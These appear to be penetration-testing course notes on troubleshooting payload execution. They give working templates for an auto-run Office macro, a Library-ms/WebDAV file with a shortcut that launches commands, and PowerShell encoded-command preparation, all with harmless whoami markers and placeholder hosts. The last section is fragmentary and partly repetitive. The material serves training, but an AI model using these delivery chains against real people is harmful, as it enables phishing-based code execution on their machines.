Resolve payload execution obstacles

Strategy map | Master Notes | Operational index | Cheatsheets

Locate the first failed boundary: delivery → trigger → parser → format/runtime → execution policy/control → connection → session. Change the condition supported by evidence instead of replacing every payload component.

Speedrun blocks: 14; used throughout 4, 6, 7 and 12–13. Documented methods: 9.

Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery.

First pass: tools and findings

Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition.

Find the first failed runtime boundary

Check bytes, file type, architecture and runtime before trying another payload.

file FILE
sha256sum FILE
readelf -l FILE 2>/dev/null
uname -m
  • If Wrong architecture or executable format: Fix the artifact/build before re-running it. → Compile and minimally adapt an existing native or memory-corruption PoC.
  • If The file reaches a different parser than expected: Inspect quoting, encoding and the exact invocation. → Repair quoting, encoding and command-length boundaries.
  • Otherwise: The artifact runs but no session appears: inspect handler and packet direction. → Pair staged payloads with the correct handler and session lifecycle.

Match the payload handler and connection direction

Keep the exact payload/session type, listener address and actual initiator together.

show options
jobs
sessions
  • If Handler settings match but no packet arrives: Check the callback route from the target, including any pivot. → Diagnose connection direction, listener and session failures in order.
  • If A session opens under the expected identity: Verify the host and make the command channel usable. → Verify command execution, host and represented identity.
  • Otherwise: A connection immediately dies: inspect the actual process/session lifecycle rather than assuming a working shell. → Use a framework module with explicit target and feature constraints.

Discovery workflow

Start with the saved delivery/trigger/parser/runtime/connection chain and the last state actually proved.

Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed.

  1. For client-side paths establish the consumer and required interaction before callbacks: Use a gated Office macro delivery chain; Use a Windows Library/WebDAV/shortcut chain with explicit interaction.
  2. Inspect bytes, format, architecture, parser and runtime at the first failed boundary: Match an artifact to its executable consumer and runtime; Repair quoting, encoding and command-length boundaries.
  3. Differentiate PowerShell language/policy and endpoint-control evidence: Distinguish PowerShell policy, language mode and protected execution layers; Interpret endpoint-control evidence and select a justified alternative.
  4. Match the exact handler and session lifecycle, then inspect actual packet direction: Pair staged payloads with the correct handler and session lifecycle; Use a framework module with explicit target and feature constraints; Diagnose connection direction, listener and session failures in order.

Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive.

Method families

  • Client-side delivery and interaction: Use a gated Office macro delivery chain, Use a Windows Library/WebDAV/shortcut chain with explicit interaction.
  • Format, parser and control boundaries: Match an artifact to its executable consumer and runtime, Repair quoting, encoding and command-length boundaries, Distinguish PowerShell policy, language mode and protected execution layers, Interpret endpoint-control evidence and select a justified alternative.
  • Handlers, framework state and callbacks: Pair staged payloads with the correct handler and session lifecycle, Use a framework module with explicit target and feature constraints, Diagnose connection direction, listener and session failures in order.

Use a gated Office macro delivery chain

Blocks: 14; used throughout 4, 6, 7 and 12–13. Operational procedure | Quick sheet

1. Purpose and result

A verified document-triggered command effect under the opening user's identity.

2. Recognition clues

An assigned client-side scenario includes Office and a document-open interaction.

Find the clue from your starting access

Where to investigate: From the assigned client-side scenario identify the actual Office consumer, required open/enable interaction and file-origin policy before investigating callbacks.

Discovery action — reference example:

Get-Item .\FILE -Stream *
Get-Content .\FILE -Stream Zone.Identifier -ErrorAction SilentlyContinue

Illustrative evidence — synthetic, abbreviated:

The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.

Zone.Identifier present
ZoneId=3
Office interaction: document opens; macro execution not observed

Recognize this detail: Internet-origin metadata and absent macro execution localize an earlier gate than network connectivity.

Still missing before method selection: Check compatible Office, actual macro/user trigger and applicable policy; a delivered/opened document is not execution.

Outcome after checkingExample and next decision
Enabled after validationThe permitted interaction triggers the expected bounded command effect: choose the supported delivery chain.
Ruled out in this contextOffice/policy blocks the required macro path: reject this chain under those conditions.
InconclusiveA missing callback with no trigger evidence leaves execution unknown.

If you do not yet have this clue: start with Diagnose connection direction, listener and session failures in order.

3. Prerequisites

Starting access: A recorded delivery/execution chain with the expected consumer and effect. Required conditions: Compatible installed Office/macro support, a real required user interaction, executable document state and allowed macro/security policy.

4. Discover and verify prerequisites

Get-Item .\FILE -Stream *
Get-Content .\FILE -Stream Zone.Identifier -ErrorAction SilentlyContinue

5. Why it works

Delivery, document open, macro enablement and child-process execution are separate gates. Mark of the Web and current Office policy can block a chain before any callback occurs.

6. Execute and choose variants

Use a macro-enabled format such as .docm or a legacy .doc; .docx does not persist embedded VBA macros by itself. Store the macro in the document, not only the global template. A minimal harmless execution proof is:

Sub AutoOpen()
    RunProof
End Sub

Sub Document_Open()
    RunProof
End Sub

Sub RunProof()
    CreateObject("WScript.Shell").Run _
        "cmd.exe /c whoami > %TEMP%\oscp-marker.txt", 0, True
End Sub

AutoOpen and Document_Open cover distinct Word opening paths. Replace the proof command only after the document, trigger and execution context are confirmed.

Modern Office commonly blocks VBA macros in files carrying Mark of the Web rather than offering a universal one-click enable path. Relevant gates include:

  • file format actually supports the macro;
  • macro is stored in the delivered document;
  • MOTW/Zone Identifier and security zone;
  • Protected View and Trust Center settings;
  • signed publisher or Trusted Location decisions;
  • organization GPO that the user cannot override;
  • user opened the document and performed the required permitted action;
  • Office launched the expected child process;
  • the child command survived VBA, CMD and PowerShell quoting;
  • delivery and callback network paths both work.

Inspect a file's zone without changing it:

Get-Item -LiteralPath 'C:\PATH\FILE.docm' -Stream *
Get-Content -LiteralPath 'C:\PATH\FILE.docm' -Stream Zone.Identifier

ZoneId=3 represents the Internet zone. Absence of the stream does not prove that macro policy permits execution, and removing MOTW does not override every policy.

7. Worked example — hypothetical

Observation: the document is delivered but no shell appears. Test: inspect the open/macro-trigger and policy gates first. Illustrative output: macros are blocked before the command executes. Interpretation: the callback is not yet the failed boundary.

8. Verify the result

Verify the actual macro-triggered effect and user context; document receipt is not execution.

9. Failure and fallback

Missing Office, absent interaction, blocked internet macros or incompatible content invalidates the chosen chain. Use a method supported by the assigned scenario.

10. Next transitions

Repair quoting, encoding and command-length boundaries; Diagnose connection direction, listener and session failures in order; Use Windows authenticated access or a PowerShell command channel.

Use a Windows Library/WebDAV/shortcut chain with explicit interaction

Blocks: 14; used throughout 4, 6, 7 and 12–13. Operational procedure | Quick sheet

1. Purpose and result

A verified shortcut-triggered command under the interacting user's identity.

2. Recognition clues

A client-side scenario permits a Library file and remote share presentation.

Find the clue from your starting access

Where to investigate: Inspect the actual Library XML, remote resource and shortcut properties from the assigned delivery scenario; distinguish browsing from launching.

Discovery action — reference example:

Get-Content .\FILE.library-ms
Test-NetConnection LHOST -Port PORT

Illustrative evidence — synthetic, abbreviated:

The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.

Library resource: http://LHOST:PORT/
Remote folder request: observed
Shortcut launch: not observed

Recognize this detail: The resource can be presented while the executable user interaction is still absent.

Still missing before method selection: Verify compatible WebDAV/Library handling, actual shortcut target/launch, policy and its command effect.

Outcome after checkingExample and next decision
Enabled after validationThe intended launch and resulting user-context command are observed: use the supported chain.
Ruled out in this contextThe client cannot consume the resource or never performs the required allowed launch: reject that interaction path.
InconclusiveA WebDAV GET alone leaves code execution unproved.

If you do not yet have this clue: start with Diagnose connection direction, listener and session failures in order.

3. Prerequisites

Starting access: A recorded delivery/execution chain with the expected consumer and effect. Required conditions: Compatible Windows consumer, reachable WebDAV resource, correctly handled shortcut and required user launch; policy permits the action.

4. Discover and verify prerequisites

Test-NetConnection LHOST -Port PORT
Get-Item .\FILE -Stream *

5. Why it works

The Library describes a resource; browsing it is different from launching a shortcut. WebDAV access, file presentation and process execution are separate conditions.

6. Execute and choose variants

A .Library-ms file is an XML library description that can present a remote location in Explorer. The PEN-200 attack pattern is two-stage:

delivered .Library-ms
→ user opens library
→ Explorer reaches WebDAV location
→ user opens .lnk
→ shortcut launches chosen command
→ optional download/callback

If WsgiDAV is already installed, publish a dedicated authorized-lab directory:

mkdir -p webdav
wsgidav --host=0.0.0.0 --port=80 \
  --root=./webdav --auth=anonymous

Anonymous mode exposes the selected directory. Bind only to the required lab interface when possible, place no sensitive files there and stop the server after the exercise. Port 80 is the reliable baseline for a plain-HTTP Windows WebDAV location. Use another port only after confirming the target WebClient accepts that URL form and the route permits it.

Original library template using placeholders:

<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>1</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1002</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>http://LHOST/</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>

Save it with a .Library-ms extension. Windows may add a serialized location after opening it; retain a clean source copy and inspect the final artifact before delivery.

Create a shortcut on a controlled Windows preparation host:

$shortcutPath = 'C:\PATH\webdav\ACTION.lnk'
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "$env:SystemRoot\System32\cmd.exe"
$shortcut.Arguments = '/c whoami > %TEMP%\oscp-marker.txt'
$shortcut.WorkingDirectory = $env:TEMP
$shortcut.IconLocation = "$env:SystemRoot\System32\imageres.dll,11"
$shortcut.Save()

Only after the harmless marker works, substitute a command compatible with the target and the separately proven callback route. Diagnose this chain at three independent network points:

Explorer → WebDAV
shortcut command → optional payload/download server
executed payload → listener/handler

Failure cues:

ObservationNext boundary
Library opens emptyWebDAV bind, reachability, WebClient/policy, modified library serialization
WebDAV receives nothingArtifact not opened, URL/port wrong, client route or WebDAV blocked
Directory appears; shortcut never runsRequired second user action absent or shortcut blocked
Marker works; download absentCommand quoting, DNS and payload-server route
Download occurs; no executionFormat, permissions, policy, quarantine or dependency
Execution proven; no callbackListener, route, payload/handler compatibility

7. Worked example — hypothetical

Observation: the Library opens the remote location but no command executes. Test: verify whether the shortcut was actually launched and its target parsed. Illustrative output: only directory browsing occurred. Interpretation: the interaction trigger remains missing.

8. Verify the result

Verify the launched command's identity/effect and distinguish WebDAV requests from execution.

9. Failure and fallback

Unavailable WebDAV client, blocked remote path, missing shortcut interaction or policy can stop the chain before a callback.

10. Next transitions

Repair quoting, encoding and command-length boundaries; Match an artifact to its executable consumer and runtime; Diagnose connection direction, listener and session failures in order.

Match an artifact to its executable consumer and runtime

Blocks: 14; used throughout 4, 6, 7 and 12–13. Operational procedure | Quick sheet

1. Purpose and result

A correctly identified artifact/runtime boundary and a suitable execution choice.

2. Recognition clues

A downloaded/generated artifact exists but does not run.

Find the clue from your starting access

Where to investigate: Inspect a transferred/generated artifact's bytes, executable format and required consumer/loader before interpreting runtime errors.

Discovery action — reference example:

file FILE
sha256sum FILE
readelf -l FILE 2>/dev/null
uname -m

Illustrative evidence — synthetic, abbreviated:

The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.

FILE: ELF 32-bit
Requested interpreter: /PATH/TO/LOADER
Execution error: No such file or directory

Recognize this detail: An existing file can fail because its loader/runtime is missing; this is separate from callback failure.

Still missing before method selection: Verify exact architecture, loader/runtime, permissions, mount policy, line endings and integrity.

Outcome after checkingExample and next decision
Enabled after validationThe matching consumer loads intact bytes and the minimal effect works: choose that artifact.
Ruled out in this contextA PE/ELF/DLL or architecture mismatch is incompatible with the intended consumer: reject that artifact.
InconclusiveA file-exists check without loader/hash evidence leaves the failure layer unresolved.

If you do not yet have this clue: start with Diagnose connection direction, listener and session failures in order.

3. Prerequisites

Starting access: A recorded delivery/execution chain with the expected consumer and effect. Required conditions: Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format.

4. Discover and verify prerequisites

file FILE
sha256sum FILE
readelf -l FILE 2>/dev/null
uname -m

5. Why it works

A file may exist while its dynamic loader is missing. A 64-bit OS can host a 32-bit consumer, and a DLL is not interchangeable with an EXE or script.

6. Execute and choose variants

The file extension is not the execution contract. Record all of these:

target OS and build
target process architecture
artifact format
loader/interpreter
execution identity and integrity
working directory and PATH
required runtime/libraries
arguments and quoting
network direction
handler protocol
4.1 Linux checks
uname -a
uname -m
file PAYLOAD
readelf -h PAYLOAD | sed -n '1,25p'
ldd PAYLOAD
ls -l PAYLOAD
findmnt -T /PATH/TO/PAYLOAD
head -n 1 SCRIPT

Common interpretations:

  • Exec format error: wrong format/architecture or invalid interpreter line;
  • Permission denied: missing execute permission, inaccessible parent directory, noexec, policy or identity issue;
  • No such file or directory when the file exists: missing dynamic loader or broken shebang interpreter;
  • missing shared object: runtime library mismatch;
  • ^M in a shebang: CRLF line endings changed the interpreter path;
  • works interactively but not through cron/service: environment, working directory, shell, identity or route differs.
4.2 Windows checks
Get-CimInstance Win32_OperatingSystem |
  Select-Object Caption,Version,BuildNumber,OSArchitecture

[Environment]::Is64BitOperatingSystem
[Environment]::Is64BitProcess
$env:PROCESSOR_ARCHITECTURE
Get-AuthenticodeSignature -FilePath 'C:\PATH\PAYLOAD.exe'

Keep OS architecture and consumer-process architecture separate. A 64-bit OS can run a 32-bit process under WOW64; injected code and DLLs must match the process they enter. A normal executable is not necessarily a service executable, DLL, MSI or script:

ConsumerRequired property / common failure
Direct process creationCompatible PE/ELF/script and dependencies
Windows serviceService-compatible entry/control behavior; error 1053 may follow execution of a non-service program
DLL loader/hijackCorrect bitness, expected exports and dependency behavior
msiexecValid MSI package, not an EXE renamed .msi
PowerShellValid syntax, edition/runtime compatibility and applicable policy/control state
Existing memory-corruption PoCDocumented architecture, space, bad characters and exit behavior

7. Worked example — hypothetical

Observation: Linux says not found for an existing executable. Test: inspect its ELF interpreter and architecture. Illustrative output: the required loader is absent. Interpretation: choose a compatible artifact rather than changing callback IPs.

8. Verify the result

Verify matching bytes, consumer and actual minimal execution effect; on Windows inspect PE architecture/runtime and resulting process.

9. Failure and fallback

Permission, mount policy, CRLF/shebang, missing runtime and architecture mismatches require different fixes.

10. Next transitions

Compile and minimally adapt an existing native or memory-corruption PoC; Generate a payload matching OS, process, format and handler; Repair quoting, encoding and command-length boundaries; Use a gated Office macro delivery chain; Use a Windows Library/WebDAV/shortcut chain with explicit interaction.

Repair quoting, encoding and command-length boundaries

Blocks: 14; used throughout 4, 6, 7 and 12–13. Operational procedure | Operational procedure | Quick sheet

1. Purpose and result

A command representation that survives every required parser.

2. Recognition clues

A simple command works while a longer or nested payload fails.

Find the clue from your starting access

Where to investigate: Compare the last working simple command with the first added quoting/encoding layer; record which parser receives each representation.

Discovery action — reference example:

4. Discover and verify prerequisites

5. Why it works

HTTP encoding, shell quoting, PowerShell UTF-16LE encoding and application string escaping solve different transformations. Encoding is not encryption or an endpoint-control bypass.

6. Execute and choose variants

Write the real chain:

document/shortcut or HTTP/SQL/template input
→ application parser
→ VBA/WScript/application runtime
→ cmd.exe /c, /bin/sh -c or PowerShell
→ final command/payload

Start with a short marker at every layer. Check:

  • quote ownership at each layer;
  • expansion of %VAR%, $VAR and PowerShell variables;
  • metacharacters such as &, |, <, >, ;, backticks and parentheses;
  • URL/JSON/XML/Base64 decode count;
  • command-line, VBA-string, request-field or exploit-buffer length;
  • current directory and relative paths.

PowerShell encoded-command preparation:

$command = 'COMMAND'
$bytes = [Text.Encoding]::Unicode.GetBytes($command)
[Convert]::ToBase64String($bytes)

powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE

-EncodedCommand uses UTF-16LE. It solves some transport/quoting problems; it is not encryption and does not establish antimalware evasion.

Write the parser chain explicitly:

HTTP/SQL/template parser
→ application language
→ command launcher (`system`, `cmd /c`, `/bin/sh -c`, PowerShell)
→ target shell/interpreter
→ payload command

Test each layer with a small command. Encode only for the layer that consumes the characters:

python3 -c 'import urllib.parse; print(urllib.parse.quote("COMMAND"))'

Typical failures:

  • &, |, >, <, $, backticks, quotes or spaces consumed by an outer shell;
  • URL decoding occurs zero, one or two times;
  • JSON, XML, SQL or template quoting changes the command;
  • PowerShell receives UTF-8 Base64 instead of required UTF-16LE;
  • payload length exceeds a field, command line or exploit buffer;
  • 32-bit payload is injected into a 64-bit context or the reverse.

Modern protection can inspect files, scripts after decoding, process memory, behavior and network activity. Therefore:

  • changing a filename does not imply a new payload;
  • Base64 does not imply concealment from AMSI;
  • an in-memory technique is not automatically invisible;
  • an encoder is primarily useful for transport/bad-character constraints, not guaranteed AV bypass;
  • a clean third-party scanner result does not prove execution on the target and may disclose a private sample.

Prefer the least complex route already supported by evidence: a direct command, native interpreter, authenticated management service or simple command shell may meet the objective without a custom binary. Deep shellcode development, process-injection implementation and generalized AV-bypass recipes are outside this speedrun.

  • file never arrived or hashes differ;
  • file arrived and disappeared/quarantined;
  • process creation was denied;
  • script content was blocked;
  • process started and exited/crashed;
  • callback was blocked after execution;
  • application-control or language-mode restrictions;
  • ordinary format, architecture, permission or dependency errors.

Prefer an already available native or authenticated route when it satisfies the objective. Encoding is transport representation, not proof of evasion. Custom shellcode development and deep AV-bypass work are outside this unit.

For MOTW/Office/Library-file delivery, execution-policy precedence, AMSI/AppLocker/Defender evidence and restricted Metasploit module/session handling, continue with payload execution obstacles.

  6. Route: test target-to-listener reachability from the execution context.
  7. Security control: use concrete errors, quarantine, logs or process behavior.
  8. Session: repair TTY, buffering, encoding and job control after connection.
